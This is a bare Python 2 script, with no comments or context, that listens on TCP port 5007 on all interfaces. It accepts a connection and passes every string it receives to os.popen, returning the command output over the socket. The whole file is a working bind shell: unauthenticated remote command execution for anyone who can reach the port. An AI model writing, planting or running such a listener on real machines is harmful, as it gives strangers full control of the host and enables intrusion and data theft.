#!/usr/bin/env python
#-*- coding: utf-8 -*-
import socket
import os
HOST = ''
PORT = 5007
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(1)
conn,addr = s.accept()
print 'Connected by',addr

while 1:
    data = conn.recv(1024)
    if not data:break
    cmd = os.popen(data)
    result = cmd.read()
    conn.sendall(result)
conn.close()




